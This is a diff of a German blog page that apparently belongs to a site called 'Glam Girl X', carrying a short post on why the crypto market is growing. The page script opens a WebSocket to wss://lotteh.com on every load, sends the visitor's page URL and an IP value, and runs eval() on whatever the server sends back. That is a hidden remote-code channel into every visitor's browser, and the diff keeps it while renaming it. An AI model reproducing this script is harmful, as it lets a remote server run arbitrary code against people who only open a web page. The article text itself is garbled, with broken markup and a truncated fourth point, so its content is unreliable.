@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Wie wächst der Krypto -Markt so schnell?p> <br> </p> <p> 1.Erhöhtes Bewusstsein und Adoption: Wenn mehr Menschen sich der Kryptowährungen und ihrer potenziellen Vorteile bewusst werden, ist die Nachfrage nach Kryptowährungsinvestitionen erheblich zugenommen.Dieses erhöhte Interesse hat zu einem Anstieg der Anzahl der am Markt beteiligten Benutzer und Investoren geführt. </P> <p> <br> </p> <p> 2.Institutionelle Beteiligung: In den letzten Jahren haben wir immer mehr institutionelle Investoren wie Hedgefonds, Banken und andere Finanzinstitute festgestellt, die sich auf dem Kryptowährungsmarkt engagieren.Dies hat dem Markt Glaubwürdigkeit erhöht und noch mehr Investoren angezogen. </P> <p> <br> </p> <p> 3.Technologische Fortschritte: Die technologischen Entwicklungen im Blockchain -Bereich haben es den neuen Kryptowährungen erleichtert, geschaffen und gehandelt zu werden.Zusätzlich Fortschritte inSicherheitsmaßnahmen und regulatorische Rahmenbedingungen haben den Markt für Investoren attraktiver gemacht. </p> <p> <br> </p> <p> 4.Marktvolatilität: Die stark volatile Natur des Kryptowährungsmarkt> 5.Globale Akzeptanz: Kryptowährungen werden jetzt als Zahlungsform durch eine zunehmende Anzahl von Händlern und Unternehmen auf der ganzen Welt akzeptiert.Dies hat dazu beigetragen, Kryptowährungen als praktikable Alternative zu herkömmlichen Fiat -Währungen zu legitimieren.Setzen Sie die Expansion in der weiter voran</div>
+<div style="white-space: pre-wrap;"><p>Wie wächst der Kryptomarkt so schnell?</p><p><br/></p><p>Es gibt mehrere Faktoren, die zum schnellen Wachstum des Kryptowährungsmarktes beitragen. </p><p><br/></p><p>1. Erhöhtes Bewusstsein und Adoption: Da mehr Menschen Kryptowährungen und ihre potenziellen Vorteile bewusst werden, ist die Nachfrage nach Kryptowährungsinvestitionen erheblich zugenommen. Dieses erhöhte Interesse hat zu einem Anstieg der Anzahl der am Markt beteiligten Benutzer und Investoren geführt.</p><p><br/></p><p>2. Institutionales Engagement: In den letzten Jahren haben wir immer mehr institutionelle Investoren wie Hedgefonds, Banken und andere Finanzinstitute gesehen, die sich auf den Kryptowährungsmarkt engagieren. Dies hat dem Markt Glaubwürdigkeit erweitert und noch mehr Investoren angezogen.</p><p><br/></p><p>3. Technologische Fortschritte: Die technologischen Entwicklungen im Blockchain -Bereich haben es den neuen Kryptowährungen erleichtert, erstellt und gehandelt zu werden. Darüber hinaus haben Fortschritte bei Sicherheitsmaßnahmen und regulatorischen Rahmenbedingungen den Markt für Anleger attraktiver gemacht.</p><p><br/></p><p>V.</p><p><br/></p><p>5. Globale Akzeptanz: Kryptowährungen werden jetzt als Zahlungsform durch immer mehr Händler und Unternehmen auf der ganzen Welt akzeptiert. Dies hat dazu beigetragen, Kryptowährungen als praktikable Alternative zu herkömmlichen Fiat -Währungen zu legitimieren.</p><p><br/></p><p>Insgesamt haben diese Faktoren zum raschen Wachstum des Kryptowährungsmarktes beigetragen und dürften in Zukunft seine Expansion weiter vorantreiben.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
